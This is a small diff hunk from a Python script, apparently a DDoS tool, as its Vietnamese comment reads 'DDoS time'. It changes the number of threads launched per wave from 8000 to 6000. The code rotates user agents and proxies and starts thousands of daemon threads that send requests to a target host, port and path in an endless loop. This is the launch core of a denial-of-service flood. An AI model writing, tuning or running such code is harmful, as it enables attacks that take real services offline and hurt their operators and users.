@@ -107,7 +107,7 @@ def main():
     _USERAGENTS = getUserAgents(10000)
     _PROXIES = readLines(_FILE)
     while True:
-        for hahh in range(8000):
+        for hahh in range(6000):
                 thread = threading.Thread(target=makeRequests, args=(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH, ),daemon=True)
                 thread.start()
         time.sleep(30) # Thời gian DDoS (s)
